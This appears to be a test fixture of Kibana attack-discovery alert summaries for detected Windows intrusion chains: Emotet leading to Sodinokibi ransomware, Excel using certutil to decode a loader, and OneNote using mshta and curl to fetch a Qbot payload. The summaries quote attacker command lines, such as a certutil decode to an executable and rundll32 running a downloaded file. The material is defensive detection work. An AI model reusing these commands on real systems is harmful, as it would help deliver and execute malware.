source.kibana.alert.attack_discovery.details_ma:
- The attack on {{ host.name b1beeeb3-f61d-4cc4-bcf5-20b2b15d8da8 }} starts with {{ process.name explorer.exe }} writing a suspicious file {{ file.name bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36 }} to {{ file.path C:\Users\Administrator\Desktop\8934878593\bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36 }}.
- {{ process.name regsvr32.exe }} loads {{ file.name bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36.dll }} ({{ file.path C:\Users\Administrator\Desktop\8934878593\bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36.dll }}), a known code execution vector (MITRE: Execution).
- The DLL is copied to {{ file.path C:\Windows\system32\TRENpvQLoAQYWTPK\OzwVOlaOnbXRjzj.dll }} and loaded again by {{ process.name regsvr32.exe }}, suggesting privilege escalation or lateral movement.
- Memory threat detection flags {{ process.name regsvr32.exe }} as running {{ rule.name Windows.Trojan.Emotet }}, and later loading another DLL at {{ file.path C:\Windows\system32\RwUHliEElU\WsmpRExIFs.dll }}.
- Registry run keys are modified by {{ process.name regsvr32.exe }} ({{ rule.name Registry Run Key Modified by Unusual Process }}, {{ rule.name Suspicious String Value Written to Registry Run Key }}), establishing persistence (MITRE: Persistence).
- The attack culminates with {{ process.name MsMpEng.exe }} (Windows Defender) being injected with {{ rule.name Windows.Ransomware.Sodinokibi }}, and canary ransomware files are created ({{ Ransomware.files.path c:\hd3vuk19y-readme.txt }}), confirming impact (MITRE: Impact).
- All actions are performed by {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}. The chain is validated by process ancestry, file paths, and rule transitions.

- The attack on {{ host.name SRVWIN03 }} starts with {{ process.name explorer.exe }} writing a suspicious file {{ file.name bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36 }} to {{ file.path C:\Users\Administrator\Desktop\8934878593\bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36 }}.
- {{ process.name regsvr32.exe }} loads {{ file.name bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36.dll }} ({{ file.path C:\Users\Administrator\Desktop\8934878593\bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36.dll }}), a known code execution vector (MITRE: Execution).
- The DLL is copied to {{ file.path C:\Windows\system32\TRENpvQLoAQYWTPK\OzwVOlaOnbXRjzj.dll }} and loaded again by {{ process.name regsvr32.exe }}, suggesting privilege escalation or lateral movement.
- Memory threat detection flags {{ process.name regsvr32.exe }} as running {{ rule.name Windows.Trojan.Emotet }}, and later loading another DLL at {{ file.path C:\Windows\system32\RwUHliEElU\WsmpRExIFs.dll }}.
- Registry run keys are modified by {{ process.name regsvr32.exe }} ({{ rule.name Registry Run Key Modified by Unusual Process }}, {{ rule.name Suspicious String Value Written to Registry Run Key }}), establishing persistence (MITRE: Persistence).
- The attack culminates with {{ process.name MsMpEng.exe }} (Windows Defender) being injected with {{ rule.name Windows.Ransomware.Sodinokibi }}, and canary ransomware files are created ({{ Ransomware.files.path c:\hd3vuk19y-readme.txt }}), confirming impact (MITRE: Impact).
- All actions are performed by {{ user.name Administrator }}. The chain is validated by process ancestry, file paths, and rule transitions.
source.kibana.alert.attack_discovery.entity_sum: Ransomware on {{ host.name b1beeeb3-f61d-4cc4-bcf5-20b2b15d8da8 }} for {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}.
Ransomware on {{ host.name SRVWIN03 }} for {{ user.name Administrator }}.
source.kibana.alert.attack_discovery.summary_ma: Emotet infection on {{ host.name b1beeeb3-f61d-4cc4-bcf5-20b2b15d8da8 }} leads to Sodinokibi ransomware via regsvr32 and registry persistence for {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}.
Emotet infection on {{ host.name SRVWIN03 }} leads to Sodinokibi ransomware via regsvr32 and registry persistence for {{ user.name Administrator }}.
source.kibana.alert.attack_discovery.title: Emotet to Sodinokibi ransomware chain
source.kibana.alert.rule.name: Insights_Testing

source.kibana.alert.attack_discovery.details_ma:
- On {{ host.name e2f60ed2-93dd-4eec-8d0e-d15833c64374 }}, {{ process.name EXCEL.EXE }} spawns {{ process.name certutil.exe }} to decode a file ({{ process.command_line certutil -decode C:\Programdata\B1Z8U2N9.txt C:\Programdata\Q3C7N1V8.exe }}), a known LOLBAS technique (MITRE: Execution).
- The decoded file {{ file.name Q3C7N1V8.exe }} is executed as a suspicious process, which is unsigned and modifies registry keys for persistence ({{ rule.name Uncommon Persistence via Registry Modification }}, {{ rule.name Registry Persistence via Microsoft Office Descendant Process }}).
- {{ process.name Q3C7N1V8.exe }} writes {{ file.name cdnver.dll }} to {{ file.path C:\Users\Administrator\AppData\Local\cdnver.dll }}.
- {{ process.name rundll32.exe }} loads {{ file.name cdnver.dll }}, furthering code execution and defense evasion (MITRE: Defense Evasion).
- All activity is under {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}. The chain is validated by process ancestry, file paths, and registry modifications.

- On {{ host.name SRVWIN01 }}, {{ process.name EXCEL.EXE }} spawns {{ process.name certutil.exe }} to decode a file ({{ process.command_line certutil -decode C:\Programdata\B1Z8U2N9.txt C:\Programdata\Q3C7N1V8.exe }}), a known LOLBAS technique (MITRE: Execution).
- The decoded file {{ file.name Q3C7N1V8.exe }} is executed as a suspicious process, which is unsigned and modifies registry keys for persistence ({{ rule.name Uncommon Persistence via Registry Modification }}, {{ rule.name Registry Persistence via Microsoft Office Descendant Process }}).
- {{ process.name Q3C7N1V8.exe }} writes {{ file.name cdnver.dll }} to {{ file.path C:\Users\Administrator\AppData\Local\cdnver.dll }}.
- {{ process.name rundll32.exe }} loads {{ file.name cdnver.dll }}, furthering code execution and defense evasion (MITRE: Defense Evasion).
- All activity is under {{ user.name Administrator }}. The chain is validated by process ancestry, file paths, and registry modifications.
source.kibana.alert.attack_discovery.entity_sum: Loader persistence on {{ host.name e2f60ed2-93dd-4eec-8d0e-d15833c64374 }} for {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}.
Loader persistence on {{ host.name SRVWIN01 }} for {{ user.name Administrator }}.
source.kibana.alert.attack_discovery.summary_ma: Excel spawns certutil to decode and run loader {{ file.name Q3C7N1V8.exe }} with registry persistence on {{ host.name e2f60ed2-93dd-4eec-8d0e-d15833c64374 }}.
Excel spawns certutil to decode and run loader {{ file.name Q3C7N1V8.exe }} with registry persistence on {{ host.name SRVWIN01 }}.
source.kibana.alert.attack_discovery.title: Office to certutil to custom loader
source.kibana.alert.attack_discovery.title_with: Office to certutil to custom loader
source.kibana.alert.rule.name: Insights_Testing

source.kibana.alert.attack_discovery.details_ma:
- On {{ host.name b2dd70c5-4641-4223-adfb-45ba5ed26fe7 }}, {{ process.name ONENOTE.EXE }} spawns {{ process.name mshta.exe }} to execute an embedded HTA file ({{ process.command_line "C:\Windows\SysWOW64\mshta.exe" ... }}), a phishing technique (MITRE: Initial Access).
- {{ process.name mshta.exe }} downloads a payload via {{ process.name curl.exe }} ({{ process.command_line "C:\Windows\System32\curl.exe" --output C:\ProgramData\121.png ... }}).
- The payload is executed via {{ process.name rundll32.exe }} ({{ process.command_line "C:\Windows\System32\rundll32.exe" C:\ProgramData\121.png,Wind }}), detected as process injection and defense evasion.
- Memory threat detections (shellcode injection, Qbot) and registry run key modifications confirm persistence and C2 activity (MITRE: Command and Control).
- All actions are under {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}. The chain is validated by process ancestry, file paths, and registry modifications.

- On {{ host.name SRVWIN04 }}, {{ process.name ONENOTE.EXE }} spawns {{ process.name mshta.exe }} to execute an embedded HTA file ({{ process.command_line "C:\Windows\SysWOW64\mshta.exe" ... }}), a phishing technique (MITRE: Initial Access).
- {{ process.name mshta.exe }} downloads a payload via {{ process.name curl.exe }} ({{ process.command_line "C:\Windows\System32\curl.exe" --output C:\ProgramData\121.png ... }}).
- The payload is executed via {{ process.name rundll32.exe }} ({{ process.command_line "C:\Windows\System32\rundll32.exe" C:\ProgramData\121.png,Wind }}), detected as process injection and defense evasion.
- Memory threat detections (shellcode injection, Qbot) and registry run key modifications confirm persistence and C2 activity (MITRE: Command and Control).
- All actions are under {{ user.name Administrator }}. The chain is validated by process ancestry, file paths, and registry modifications.
source.kibana.alert.attack_discovery.entity_sum: C2 loader on {{ host.name b2dd70c5-4641-4223-adfb-45ba5ed26fe7 }} for {{ user.name e7136b97-e77c-486b-93ee-d887819fddf9 }}.
C2 loader on {{ host.name SRVWIN04 }} for {{ user.name Administrator }}.
